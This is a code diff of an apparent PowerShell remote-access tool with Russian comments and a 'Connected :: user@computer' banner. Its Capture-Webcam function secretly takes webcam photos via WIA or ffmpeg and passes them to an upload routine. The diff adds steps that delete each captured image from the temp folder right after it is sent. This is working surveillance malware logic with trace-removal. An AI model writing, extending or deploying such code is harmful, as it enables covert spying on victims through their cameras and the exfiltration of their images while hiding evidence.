@@ -282,7 +282,7 @@ function Connect-ZiPo {
 
    function Capture-Webcam {
     try {
-        # Попытка захвата через WIA (если камера доступна через WIA)
+        # Попытка захвата через WIA
         $manager = New-Object -ComObject WIA.DeviceManager
         foreach ($deviceInfo in $manager.DeviceInfos) {
             try {
@@ -290,7 +290,9 @@ function Connect-ZiPo {
                 $img = $dev.Items.Item(1).Transfer()
                 $file = "$env:TEMP\webcam_$($deviceInfo.Properties[1].Value).jpg"
                 $img.SaveFile($file)
-                return Upload-File $file
+                $uploadResult = Upload-File $file
+                Remove-Item $file -Force -ErrorAction SilentlyContinue
+                return $uploadResult
             }
             catch {
                 continue
@@ -323,7 +325,7 @@ function Connect-ZiPo {
         $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"
         $ffmpegExec = $global:ffmpegPath
         
-        # Получаем список устройств через ffmpeg и сохраняем вывод
+        # Получаем список устройств через ffmpeg (с live логированием)
         $cameraOutput = & cmd /c "`"$ffmpegExec`" -list_devices true -f dshow -i dummy" 2>&1
         Write-Host "[*] ffmpeg device list:" -ForegroundColor Cyan
         Write-Host $cameraOutput
@@ -354,7 +356,11 @@ function Connect-ZiPo {
         Start-Process -FilePath $ffmpegExec -ArgumentList "-f dshow -i video=`"$cameraName`" -frames:v 1 `"$tempImage`"" -NoNewWindow -Wait
         if (Test-Path $tempImage) {
             Write-Host "[*] Image captured successfully." -ForegroundColor Cyan
-            return Upload-File $tempImage
+            # Сохраняем результат отправки снимка
+            $uploadResult = Upload-File $tempImage
+            # Удаляем файл-снимок сразу после отправки
+            Remove-Item $tempImage -Force -ErrorAction SilentlyContinue
+            return $uploadResult
         }
         else {
             return "[ERROR] Failed to capture image using ffmpeg."
@@ -364,6 +370,7 @@ function Connect-ZiPo {
         return "[ERROR] Webcam capture failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
@@ -443,7 +450,7 @@ ${esc}[31m
     \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
      \ \__\    \ \_______\ \__\ \__\ \_______\
       \|__|     \|_______|\|__|\|__|\|_______|
-                CAMTEST 7
+                CAMTEST CLOSEEE
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
